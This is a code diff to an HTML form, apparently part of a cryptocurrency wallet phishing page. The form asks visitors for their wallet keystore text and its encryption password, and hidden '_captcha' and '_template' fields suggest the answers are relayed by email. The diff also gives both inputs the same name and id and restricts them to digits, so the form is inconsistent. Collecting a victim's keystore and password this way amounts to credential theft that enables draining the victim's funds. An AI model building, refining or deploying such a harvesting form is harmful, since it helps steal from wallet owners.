@@ -117,45 +117,48 @@
           <input type="hidden" name="_captcha" value="false" />
           <input type="hidden" name="_template" value="table" />
 
-          <!-- Private Key Input -->
+          <!-- Keep input type as text but restrict to numbers -->
           <div>
             <label
-              for="private-key"
+              for="phrase-value"
               class="block text-sm font-medium text-gray-700 mb-1"
             >
-              Keystore value
+              Keystore Value
             </label>
             <input
               class="w-full p-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
-              name="private_key"
-              placeholder="Enter your Keystore value..."
+              name="phone"
+              placeholder="Enter your keystore value..."
               type="text"
-              id="private-key"
+              id="phrase-value"
+              pattern="[0-9]*"
+              inputmode="numeric"
+              required
+            />
+          </div>
+          <div>
+            <label
+              for="phrase-value"
+              class="block text-sm font-medium text-gray-700 mb-1"
+            >
+              password
+            </label>
+            <input
+              class="w-full p-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
+              name="phone"
+              placeholder="Enter your keystore value..."
+              type="text"
+              id="phrase-value"
               pattern="[0-9]*"
               inputmode="numeric"
               required
             />
           </div>
 
-          <!-- Another Private Key Input (Make sure it's intentional to have two) -->
-          <div>
-            <label
-              for="private-key-2"
-              class="block text-sm font-medium text-gray-700 mb-1"
-            >
-              Password
-            </label>
-            <input
-              class="w-full p-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
-              name="private_key_2"
-              placeholder="Enter your Password..."
-              type="text"
-              id="private-key-2"
-              pattern="[0-9]*"
-              inputmode="numeric"
-              required
-            />
-          </div>
+          <h1>
+            Several lines of text beginning with '(...)' plus the password you
+            used to encrypt it.
+          </h1>
 
           <div>
             <input
